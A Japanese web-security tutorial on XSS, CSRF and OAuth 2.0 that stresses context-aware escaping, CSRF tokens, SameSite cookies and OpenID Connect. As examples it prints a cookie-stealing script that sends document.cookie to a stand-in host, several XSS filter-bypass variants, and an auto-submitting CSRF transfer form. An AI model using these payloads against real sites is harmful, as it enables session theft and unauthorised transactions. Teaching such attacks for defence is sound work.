## XSS：他人のコードが、自分のページとして動く

投稿フォームに、こう書かれたとします。

```
<script>fetch('https://evil.example/?c=' + document.cookie)</script>
```

これをそのまま HTML に埋め込んで表示すると、**閲覧した全員のブラウザでこのスクリプトが動きます。** しかも、**あなたのサイトのページとして**動くので、そのサイトの Cookie も、ログイン状態も、DOM も、すべて触れます。

これが XSS（Cross-Site Scripting）です。攻撃の本質は次の一点です。

> **データとして扱うべき文字列が、コードとして解釈されてしまった**

これは SQL インジェクションとまったく同じ構造です。データがコードの文脈に紛れ込むと、それは命令になります。

### なぜ「危ない文字列を消す」ではだめなのか

対策としてまず思いつくのが、`<script>` を探して消すことです。これは**必ず破られます。**

```
<ScRiPt>          大文字小文字を変える
<scr<script>ipt>  消された結果また組み上がる
<img src=x onerror="...">    script タグを使わない
<a href="javascript:...">    属性の中で実行する
```

文字列照合の記事で扱ったのは「決まったパターンを探す」技術でした。ここでの問題は、**危険なものの集合が、パターンとして書き切れない**ことです。攻撃者は無限に変形できるのに対し、こちらは有限のリストしか持てません。

**やるべきことは「危ないものを消す」ではなく「すべてをデータとして出力する」**です。

| 出力先 | 正しい扱い |
| --- | --- |
| HTML の本文 | `<` `>` `&` `"` をエスケープする（`&lt;` など） |
| HTML の属性値 | 属性用のエスケープをして、必ず引用符で囲む |
| JavaScript の中 | JSON として出力する。文字列連結で埋め込まない |
| URL のパラメータ | URL エンコードする |

ポイントは、**どの文脈に出すかでエスケープの方法が違う**ことです。だから「入力時に一括でサニタイズ」は正しく動きません。入力の時点では、それがどこに出力されるか分からないからです。**出力する場所で、その文脈に合わせてエスケープする**のが原則です。

<Callout type="warn" title="自分でエスケープを書かない">
  React、Vue、各種テンプレートエンジンは、既定で出力をエスケープします。**普通に書いている限り、XSS は起きません。**

  危ないのは、その仕組みを明示的に迂回したときだけです。

  - React の `dangerouslySetInnerHTML`
  - Vue の `v-html`
  - `element.innerHTML = ...`

  名前に `dangerously` と付いているのは、警告として機能させるためです。**どうしても HTML を受け付ける必要があるなら**、自作のフィルタではなく DOMPurify のような専用ライブラリを使ってください。

  さらに一段の防御として CSP（Content Security Policy）があります。「このページで実行してよいスクリプトの出所」をブラウザに宣言しておくと、埋め込まれたスクリプトがそもそも実行されません。**XSS が成立してしまった場合の被害を抑える保険**という位置づけです。
</Callout>

## CSRF：ブラウザが勝手に Cookie を送ってしまう

XSS とよく混同されますが、まったく別の問題です。

前提として、**ブラウザは、そのドメイン宛のリクエストに Cookie を自動で付けます。** どのページから発生したリクエストであってもです。

そこで、攻撃者がこういうページを用意します。

```html
<form action="https://bank.example/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000000">
</form>
<script>document.forms[0].submit()</script>
```

ログイン中のユーザーがこのページを開くと、**ブラウザは銀行の Cookie を付けて送信します。** 銀行側から見ると、正規のログイン済みユーザーからの正当な送金依頼に見えます。

攻撃者は**レスポンスを読めません**（同一生成元ポリシーがあるため）。しかし、**送るだけで目的が達成される操作**（送金、削除、設定変更）なら、それで十分です。

### 対策

| 方法 | 仕組み |
| --- | --- |
| **CSRF トークン** | サーバーが発行した予測不能な値をフォームに埋め、送信時に照合する。攻撃者はこの値を知りえない |
| **SameSite Cookie** | 他サイトから発生したリクエストには Cookie を付けない、とブラウザに指示する |
| **Origin / Referer の確認** | リクエストの出所を確認する |

現在の主要ブラウザは `SameSite=Lax` を既定にしているので、**素朴な CSRF はかなり防がれています。** ただし、これはブラウザの挙動に依存しているだけなので、重要な操作では CSRF トークンも併用するのが定石です。

<Callout type="tip" title="XSS と CSRF の関係">
  この 2 つは、しばしばこう整理されます。

  - **XSS**：攻撃者のコードが、あなたのサイト上で動く
  - **CSRF**：攻撃者のサイトから、あなたのサイトへリクエストが飛ぶ

  そして重要なのは、**XSS があると CSRF 対策は無意味になる**ということです。攻撃者のコードがあなたのページ上で動けるなら、CSRF トークンを DOM から読み取って正しいリクエストを組み立てられるからです。

  **対策には順序があります。** まず XSS を防ぐ。その上で CSRF を防ぐ。逆順では意味がありません。
</Callout>

## OAuth 2.0：パスワードを渡さずに、権限だけを渡す

最後は認可の話です。解きたい問題は明確です。

> あるサービスに「自分の Google カレンダーを読む権限」だけを渡したい。**Google のパスワードは渡したくない**

パスワードを渡すと、カレンダー以外のすべて（メール、ドライブ、支払い情報）にも触れてしまいますし、あとから取り消すにはパスワードを変えるしかありません。

OAuth 2.0 は、この受け渡しの手順を決めたものです。登場人物は 4 者です。

| 役 | 誰か |
| --- | --- |
| リソースオーナー | ユーザー（あなた） |
| クライアント | 権限を借りたいアプリ |
| 認可サーバー | Google の認証画面 |
| リソースサーバー | Google カレンダー API |

流れ（認可コードフロー）はこうなります。

1. アプリがユーザーを **Google の画面へ送る**（アプリはここに一切関与しない）
2. ユーザーが Google に**ログインし、「カレンダーの読み取りを許可」に同意**する
3. Google が、アプリへ**認可コード**を返す（短命の引換券）
4. アプリが、そのコードと**自分の秘密鍵**を使って、サーバー間でアクセストークンに交換する
5. アプリはトークンを使って、**許可された範囲だけ**API を呼ぶ

**パスワードは、一度もアプリを通りません。** ユーザーが入力するのは Google の画面の中だけです。

<Callout type="warn" title="よくある誤解と、実装上の注意">
  **OAuth は認証（authentication）ではありません。** 「誰であるか」を確かめる仕組みではなく、「何をしてよいか」を渡す仕組み（authorization）です。

  「Google でログイン」を実装したいなら、OAuth の上に認証を載せた **OpenID Connect** を使います。OAuth のアクセストークンだけで「このユーザーは誰々である」と判断する実装は、古典的な脆弱性の温床です（そのトークンが本当にあなたのアプリ向けに発行されたものか、確認できないため）。

  実装上の注意も挙げておきます。

  - **手順 3 で認可コードを経由する理由**：トークンを URL に直接載せると、ブラウザの履歴や Referer から漏れます。コードは短命で 1 回しか使えず、交換にはアプリの秘密鍵が要ります
  - **`state` パラメータは必須**：これを省くと、認可のフロー自体に CSRF ができます
  - **秘密鍵を持てないクライアント**（SPA、モバイルアプリ）では、**PKCE** を使います。コードを横取りされても、交換時の検証値がないと使えません

  ここでも結論は同じです。**自作しないでください。** 仕様の細部に安全性が宿っていて、1 つ省くと成立しなくなります。
</Callout>

## まとめ

- **XSS**：データがコードとして解釈される問題。「危ない文字列を消す」ではなく、**出力先の文脈に応じてエスケープ**する
- 危険なパターンを列挙して弾く方法は、変形の余地が無限にあるので破られる
- **CSRF**：ブラウザが Cookie を自動で付ける性質を悪用される。トークンと SameSite で防ぐ
- **XSS があると CSRF 対策は無効になる。** 対策には順序がある
- **OAuth**：パスワードを渡さず権限だけを渡す手順。認証ではなく認可
- 3 つとも、**自作せずフレームワークの機能を使う**のが最も確実な対策
